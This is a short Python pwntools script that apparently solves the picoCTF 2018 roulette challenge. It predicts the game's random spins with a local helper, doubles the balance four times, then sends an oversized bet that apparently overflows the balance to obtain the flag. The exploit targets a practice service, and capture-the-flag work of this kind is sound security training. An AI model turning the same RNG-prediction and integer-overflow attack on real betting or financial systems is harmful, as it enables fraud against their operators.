from pwn import *
import subprocess

r = remote('2018shell.picoctf.com', 25443)

lines = r.recvuntil('> ').split(b'\n')

sleep(1)

for i in lines:
    print(i.decode('utf-8'))

balance = int(lines[1].split()[2][1:])
#print(balance)
log.info("Start balance: {}".format(balance))


values = subprocess.check_output(["./get_rand_seqs", str(balance)])
values = values.split(b',')
values = [int(v, 10) for v in values[:-1]]
i = 0

roulette_size = 36

for _ in range(4):

    spin = (values[i] % roulette_size) + 1
    #print(spin)
    i += 2
    log.info("Putting {}$ on {}".format(balance, spin))

    r.sendline("{}".format(balance))
    r.sendline("{}".format(spin))

    balance *= 2

    r.recvuntil('> ')

    r.recv()

spin = (values[i] % roulette_size) + 1
i += 2

r.sendline("{}".format(11474836400))
r.sendline("{}".format((spin + 1) % 36))

print(r.recvuntil('You deserve this flag!'))
print(r.recvall())

r.close()